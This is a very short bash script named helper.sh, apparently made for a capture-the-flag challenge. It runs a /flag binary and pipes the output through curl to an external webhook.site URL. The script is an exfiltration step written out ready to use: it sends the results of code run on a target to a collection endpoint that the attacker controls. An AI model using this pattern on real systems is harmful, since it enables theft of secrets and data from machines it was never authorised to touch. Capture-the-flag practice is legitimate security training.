#!/bin/bash
# helper.sh

# execute the flag and send output to your webhook
/flag | curl --data-binary @- https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2

